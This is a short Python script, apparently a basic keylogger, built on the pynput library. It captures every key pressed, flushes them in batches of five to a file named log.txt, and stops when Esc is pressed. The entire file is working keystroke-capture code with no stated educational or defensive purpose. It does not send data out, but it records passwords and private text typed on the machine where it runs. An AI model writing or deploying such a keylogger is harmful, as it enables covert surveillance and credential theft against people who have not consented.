import pynput
from pynput.keyboard import Key, Listener

count=0
keys=[]

def onpress(key):
    global keys,count
    # print("{0} pressed".format(key))
   # print(key)
    keys.append(key)
    count +=1

    if(count>=5):
        count=0
        writetofile(keys)
        keys=[]
        fileopen=1


def onrelease(key):
    if(key== Key.esc):
        return (False)

def writetofile(keys):

    with open("log.txt","a" ) as f:
        for i in keys:
            k=str(i).replace("'","")
            if(k.find("space")>0):
                f.write(' ')
            elif(k.find("Key")== -1):
                f.write(k)


with Listener(on_press=onpress, on_release= onrelease) as listener:
    listener.join()